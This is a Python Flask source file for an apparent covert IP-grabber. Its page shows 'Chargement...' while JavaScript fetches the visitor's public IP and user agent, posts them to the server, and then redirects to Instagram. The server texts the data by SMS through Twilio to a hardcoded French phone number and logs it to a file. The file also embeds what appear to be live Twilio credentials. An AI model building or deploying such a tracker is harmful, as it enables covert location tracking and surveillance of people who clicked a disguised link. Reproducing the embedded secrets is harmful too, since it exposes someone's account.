from flask import Flask, request, redirect
from twilio.rest import Client

app = Flask(__name__)

# === Infos Twilio ===
account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'
from_phone_number = '+12524866318'
to_phone_number = '+33635960569'

client = Client(account_sid, auth_token)

def send_sms(ip_address, user_agent):
    body = f"IP Address: {ip_address}\nUser Agent: {user_agent}"
    try:
        message = client.messages.create(
            body=body,
            from_=from_phone_number,
            to=to_phone_number
        )
        print(f"Message sent: {message.sid}")
    except Exception as e:
        print(f"Error sending SMS: {e}")

# === Route principale (HTML + JavaScript) ===
@app.route('/')
def index():
    return '''
    <html>
    <head><title>Chargement...</title></head>
    <body>
        <script>
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    fetch('/log_ip', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            ip: data.ip,
                            user_agent: navigator.userAgent
                        })
                    }).then(() => {
                        // Redirection après envoi
                        window.location.href = 'https://www.instagram.com';
                    });
                });
        </script>
    </body>
    </html>
    '''

# === Route pour recevoir l'IP publique ===
@app.route('/log_ip', methods=['POST'])
def log_ip():
    data = request.get_json()
    ip = data.get('ip')
    user_agent = data.get('user_agent')

    print(f"[JS] IP publique: {ip}, User-Agent: {user_agent}")

    # Envoie le SMS
    send_sms(ip, user_agent)

    # Enregistrement dans le fichier log.txt
    with open("log.txt", "a") as f:
        f.write(f"IP: {ip} - User-Agent: {user_agent}\n")

    return '', 200

# === Lancer l'app ===
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
